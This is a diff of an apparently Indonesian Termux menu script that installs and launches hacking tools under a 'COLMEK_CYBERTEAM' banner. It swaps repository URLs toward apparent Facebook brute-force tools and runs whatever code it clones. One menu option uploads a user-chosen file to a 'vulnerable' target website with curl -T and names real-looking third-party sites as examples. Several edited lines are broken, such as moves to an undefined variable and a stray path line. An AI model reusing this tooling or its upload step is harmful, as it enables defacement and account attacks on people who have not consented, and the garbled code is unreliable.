@@ -66,7 +66,7 @@ echo $green "21.> Install txtool"
 echo "[===============================================]>"
 echo $purple "22.> install sqlscan"
 echo "[===============================================]>"
-echo $cyan "23.> install hash-buster"
+echo $cyan "23.> install B4J1N64Nv5"
 echo "[===============================================]>"
 echo $red "24.> Install Red_Hawk"
 echo "[===============================================]>"
@@ -391,9 +391,9 @@ if [ $bro = 21 ] || [ $bro = 21 ]
 then
 clear
 figlet "COLMEK_CYBERTEAM" | lolcat
-git clone https://github.com/kuburan/txtool
-mv txtool $HOME
-cd $HOME/txtool
+git clone https://github.com/Bl4ckDr460n/Black-Fb-Premium
+mv txtool $Bl4ckDr460n
+cd $Bl4ckDr460n/Black-Fb-Premium
 python2 install.py
 python2 update.py
 txtool
@@ -418,9 +418,12 @@ toilet -f mono12 -F gay "COLMEK_CYBERTEAM"
 apt upgrade
 apt install python2
 apt install git
-git clone https://github.com/UltimateHackers/Hash-Buster
-mv Hash-Buster $HOME
-cd $HOME/Hash-Buster
+git clone https://github.com/colmekcyberteam/B4J1N64Nv5/
+Bl4ckDr460n/Black-Fb-Premium
+mv Bl4ckDr460n $HOME
+cd $HOME/Bl4ckDr460n
+mv B4J1N64Nv5 $HOME
+cd $HOME/B4J1N64Nv5
 python2 hash.py
 fi
 
@@ -692,8 +695,8 @@ if [ $bro = 44 ] || [ $bro = 44 ]
 then
 clear
 echo "\033[34;1m"
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet -f slant MrB4J1N64N
+cowsay -f kiss.cow "ocol" | lolcat
+figlet -f slant ocol
 echo "\033[37;1m"
 echo "Masukan Web target"
 echo "Contoh Web Target vuln"
@@ -705,10 +708,10 @@ echo "	http://50-50-50.ru/"
 echo "	http://tirupurjobs.net/"
 echo "	http://Matrimony.co.za/"
 echo "	http://Bheh.co.za/"
-read -p "[MrB4J1N64N]>" target
+read -p "[ocol]>" target
 echo "Masukan Nama script kalian"
 echo "yang ada di Luar Folder Ruang Penyimpanan"
-read -p "[MrB4J1N64N]>" script
+read -p "[ocol]>" script
 curl -T /storage/emulated/0/$script $target
 echo "\033[33;1m"
 echo "Selesai! Tod Cek di $target $script "
@@ -717,7 +720,7 @@ fi
 if [ $bro = 45 ] || [ $bro = 45 ]
 then
 clear
-cowsay -f sheep.cow "MrB4J1N64N" | lolcat
+cowsay -f sheep.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 cd
@@ -728,7 +731,7 @@ fi
 if [ $bro = 46 ] || [ $bro = 46 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 cd module
@@ -794,7 +797,7 @@ fi
 if [ $bro = 48 ] || [ $bro = 48 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 pkg install w3m
@@ -804,7 +807,7 @@ fi
 if [ $bro = 49 ] || [ $bro = 49 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -820,7 +823,7 @@ fi
 if [ $bro = 50 ] || [ $bro = 50 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 cd module
@@ -830,7 +833,7 @@ fi
 if [ $bro = 51 ] || [ $bro = 51 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 pkg install php
@@ -843,7 +846,7 @@ fi
 if [ $bro = 52 ] || [ $bro = 52 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 pkg install curl
@@ -860,18 +863,17 @@ fi
 if [ $bro = 53 ] || [ $bro = 53 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
-echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/FsI4pCapfLY"
 sleep 3
-cd module
+cd mbf
 python2 mbf.py
 fi
 
 if [ $bro = 54 ] || [ $bro = 54 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -891,7 +893,7 @@ if [ $bro = 55 ] || [ $bro = 55 ]
 then
 clear
 echo "\033[31;1m"
-cowsay ghostbusters.cow "MrB4J1N64N" 
+cowsay ghostbusters.cow "ocol" 
 figlet "COLMEK_CYBERTEAM" | lolcat
 apt update && apt upgrade
 apt install python2
@@ -908,7 +910,7 @@ fi
 if [ $bro = 56 ] || [ $bro = 56 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt install php
@@ -957,7 +959,7 @@ fi
 if [ $bro = 59 ] || [ $bro = 59 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -975,7 +977,7 @@ fi
 if [ $bro = 60 ] || [ $bro = 60 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -991,7 +993,7 @@ fi
 if [ $bro = 61 ] || [ $bro = 61 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -1006,7 +1008,7 @@ fi
 if [ $bro = 62 ] || [ $bro = 62 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -1022,7 +1024,7 @@ fi
 if [ $bro = 63 ] || [ $bro = 63 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -1038,7 +1040,7 @@ fi
 if [ $bro = 64 ] || [ $bro = 64 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -1054,7 +1056,7 @@ fi
 if [ $bro = 65 ] || [ $bro = 65 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -1073,7 +1075,7 @@ fi
 if [ $bro = 66 ] || [ $bro = 66 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
+cowsay -f kiss.cow "ocol" | lolcat
 figlet "COLMEK_CYBERTEAM" | lolcat
 sleep 1
 apt update && apt upgrade
@@ -1175,7 +1177,7 @@ echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/nw9_ECb8VQ
 sleep 5
 pkg install python2
 pkg install git
-git clone https://github.com/UltimateHackers/Breacher.git
+git clone https://github.com/colmekcyberteam/Breacher.git
 mv Breacher $HOME
 cd $HOME/Breacher
 python2 breacher.py
